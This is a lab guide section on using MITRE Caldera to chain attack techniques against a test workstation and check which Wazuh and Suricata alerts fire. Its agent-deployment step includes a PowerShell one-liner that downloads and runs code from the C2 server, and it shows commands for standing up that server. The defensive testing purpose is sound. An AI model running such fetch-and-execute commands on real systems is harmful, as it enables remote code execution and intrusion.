# MITRE Caldera — full adversary emulation (§6.2)

Atomic Red Team tests single techniques; Caldera **chains** them into an operation
(discovery → credential access → lateral movement) so you validate **correlation across
stages**, not just single events. Runs from the attacker VLAN (10.10.99.20).

## 1. Stand up the C2 server

```bash
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
docker build --build-arg WIN_BUILD=true -t caldera:server .
docker run -d --name caldera -p 8888:8888 -p 7010:7010 -p 7011:7011/udp -p 7012:7012 caldera:server
# default creds are in conf/local.yml (red/admin) — change them.
```

Server UI: `http://10.10.99.20:8888`.

## 2. Deploy the Sandcat agent to a victim

From the Caldera UI → **Agents → Deploy an agent → Sandcat**. It gives you a one-liner
to run on WKS01 (PowerShell) that beacons back. Snapshot the victim first.

```powershell
# example shape (copy the exact command + your server IP from the UI)
$server="http://10.10.99.20:8888";
IEX (New-Object System.Net.WebClient).DownloadString("$server/file/download");
```

## 3. Run a chained operation

**Operations → Create** → pick an adversary profile (e.g. *Discovery* then
*Hunter/Check* profiles, or build one from abilities across tactics). Run it and watch
the kill chain light up the SIEM stage by stage.

## What this validates

| Caldera stage | Expect in Wazuh |
|---|---|
| Discovery (whoami/net/ipconfig) | Sysmon EID 1 process bursts; auditd `recon` key on Linux |
| Credential access (LSASS) | rule `100250` (T1003.001) |
| Persistence (Run key / service) | rule `100260` (T1547.001) |
| C2 beaconing | Sysmon EID 3/22; Suricata sid `9000005`; MISP match `100600` if the domain is known-bad |
| Lateral movement (SMB/WinRM) | 4624/4625 patterns; Suricata `9000002` |

The point: a good SOC alerts on the **operation**, not just one ability. Tune your
correlation rules until a Caldera run produces a coherent case, not 40 disconnected alerts.
